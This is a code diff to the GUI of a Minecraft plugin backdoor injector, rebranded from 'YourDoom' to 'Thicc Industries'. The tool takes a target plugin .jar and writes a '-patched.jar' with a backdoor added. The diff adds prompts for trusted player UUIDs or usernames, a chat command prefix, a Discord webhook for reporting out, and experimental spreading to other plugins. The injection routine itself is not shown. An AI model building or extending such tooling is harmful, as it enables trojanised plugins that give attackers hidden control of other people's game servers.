@@ -19,10 +19,11 @@ public class InjectorGUI{
             String[] options = {"Inject", "About", "Close"};
             result = JOptionPane.showOptionDialog(
                     null,
-                    "YourDoom\n" +
+                    "Thicc Industries' Minecraft Backdoor.\n" +
                             "Requirements:\n" +
+                            "   * Minecraft UUID\n" +
                             "   * Target plugin .jar file",
-                    "YourDoom",
+                    "Thicc Industries Injector",
                     JOptionPane.YES_NO_CANCEL_OPTION,
                     JOptionPane.PLAIN_MESSAGE,
                     null,       //no custom icon
@@ -33,11 +34,12 @@ public class InjectorGUI{
             if (result == JOptionPane.NO_OPTION) {
                 JOptionPane.showMessageDialog(
                         null,
-                        "Created by: YourDoom,\n" +
-                                "Backdoor Version: 2.2.7\n" +
-                                "Release Date: May 29 2022\n" +
+                        "Created by: Thicc Industries,\n" +
+                                "Additional features by: @DarkReaper231\n" +
+                                "Backdoor Version: 3.0.0\n" +
+                                "Release Date: July 07 2022\n" +
                                 "License: GPL v3.0",
-                        "YourDoom",
+                        "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
                 );
             }
@@ -72,50 +74,82 @@ public class InjectorGUI{
         String OutPath = InPath.substring(0, sep) + "-patched.jar";
 
         /*--- Query options ---*/
+        Boolean UUIDsAreUsernames;
+        String UUIDList;
         String ChatPrefix;
         Boolean InjectOther;
         Boolean Warnings;
-        String gen = RandomStringUtils.randomAlphabetic(3);
-        ChatPrefix = (String)JOptionPane.showInputDialog(
+        String discord = "";
+
+        int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
+        UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;
+
+        UUIDList = (String)JOptionPane.showInputDialog(
                 null,
-                "Chat Command Prefix [\'UkT>\' if left empty]:",
-                "YourDoom",
+                "Minecraft " + (UUIDsAreUsernames ? "Usernames" : "UUIDs") + " (Separated by commas):",
+                "Thicc Industries Injector",
                 JOptionPane.PLAIN_MESSAGE,
                 null,
                 null,
-                gen + ">"
+                ""
+        );
+
+        //No input
+        if(UUIDList.isEmpty())
+            return;
+
+        ChatPrefix = (String)JOptionPane.showInputDialog(
+                null,
+                "Chat Command Prefix:",
+                "Thicc Industries Injector",
+                JOptionPane.PLAIN_MESSAGE,
+                null,
+                null,
+                "#"
         );
 
         //No input
         if(ChatPrefix.isEmpty())
-            ChatPrefix = "UkT>";
+            return;
+
+        discord = (String)JOptionPane.showInputDialog(
+                null,
+                "Discord webhook (Leave blank to disable):",
+                "Thicc Industries Injector",
+                JOptionPane.PLAIN_MESSAGE,
+                null,
+                null,
+                ""
+        );
 
         InjectOther = JOptionPane.showConfirmDialog(
                 null,
                 "Inject to other plugins?\n[This feature is experimental!]",
-                "YourDoom",
+                "Thicc Industries Injector",
                 JOptionPane.YES_NO_OPTION
         ) == JOptionPane.YES_OPTION;
 
         Warnings = JOptionPane.showConfirmDialog(
                 null,
-                "Enable Debug Messages?\n[Usually unwanted except for testing purposes]\n[Will not work  if injection to other plugins enabled]",
-                "YourDoom",
+                "Enable Debug Messages?\n[Please use this for github issues]",
+                "Thicc Industries Injector",
                 JOptionPane.YES_NO_OPTION
         ) == JOptionPane.YES_OPTION;
         //Parse uuids
 
-        Injector.SimpleConfig sc = new Injector.SimpleConfig(ChatPrefix, InjectOther, Warnings);
+        String[] splitUUID = UUIDList.split(",");
+
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, discord, InjectOther, Warnings);
         boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, true, true);
 
         if(result2){
-            JOptionPane.showMessageDialog(null, "Backdoor injection complete.", "YourDoom", JOptionPane.INFORMATION_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
         }else{
-            JOptionPane.showMessageDialog(null, "Backdoor injection failed.", "YourDoom", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.\nPlease run the injector again with debug messages on before submitting issues.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
         }
     }
 
     public static void displayError(String message){
-        JOptionPane.showMessageDialog(null, message, "YourDoom", JOptionPane.ERROR_MESSAGE);
+        JOptionPane.showMessageDialog(null, message, "Thicc Industries", JOptionPane.ERROR_MESSAGE);
     }
 }
